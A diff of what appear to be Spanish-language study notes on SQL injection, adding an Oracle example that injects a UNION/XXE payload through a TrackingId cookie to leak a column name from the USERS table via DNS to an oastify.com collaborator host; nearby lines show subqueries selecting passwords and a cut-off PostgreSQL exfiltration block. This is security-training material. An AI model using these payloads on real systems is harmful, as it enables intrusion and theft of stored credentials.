@@ -53,13 +53,18 @@ Para poder elegir la fila y el dato exacto, usamos la lógica de `LIMIT` y `OFFS
 |**Nombre de Tabla**|`(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)`|
 |**Dato Específico**|`(SELECT password FROM users LIMIT 1 OFFSET 0)`|
 
+>[!TIP] EJEMPLO exfiltración de datos en Oracle:
+
+```http
+TrackingId=KwTG899Hl3TwsMFW'%20union%20SELECT%20EXTRACTVALUE(xmltype('%3C?xml%20version=%221.0%22%20encoding=%22UTF-8%22?%3E%3C!DOCTYPE%20root%20[%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://' || (SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' AND column_name!='USERNAME' AND rownum=1) || '.qnhsjdr1ye0ojdtgn2hhms3rqiw9k08p.oastify.com/%22%3E%20%25remote%3b]%3E'),'/l')%20FROM%20dual--%20-
+```
+
 ---
 
 ## 3. PostgreSQL: Bloque Anónimo (El más robusto)
 
 Dado que PostgreSQL requiere a veces una estructura más compleja para manejar variables, este bloque es el más fiable para exfiltrar datos complejos:
 
-SQL
 
 ```sql
 DO $$
